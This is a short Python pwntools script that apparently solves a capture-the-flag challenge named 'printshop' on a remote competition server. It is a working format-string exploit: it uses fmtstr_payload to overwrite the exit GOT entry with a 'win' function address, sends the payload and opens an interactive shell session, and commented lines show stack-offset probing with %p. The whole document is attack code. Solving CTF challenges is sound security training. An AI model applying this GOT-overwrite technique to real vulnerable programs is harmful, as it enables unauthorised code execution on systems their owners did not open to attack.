from pwn import *

exe = ELF("./printshop")
# p = process("./printshop")
# gdb.attach(p)

p = remote("chal.pctf.competitivecyber.club", 7997)

context.binary = exe

# out = ""
# for i in range(21, 30):
#     out += f"{i}=%{i}$p "

exit_got = 0x404060
win = 0x40129d

#ret ptr at 21

frmt_write = {exit_got: win}
payload = fmtstr_payload(6, frmt_write)
log.info(f"{payload=}")
p.recvuntil(b">>")
p.sendline(payload)

p.interactive()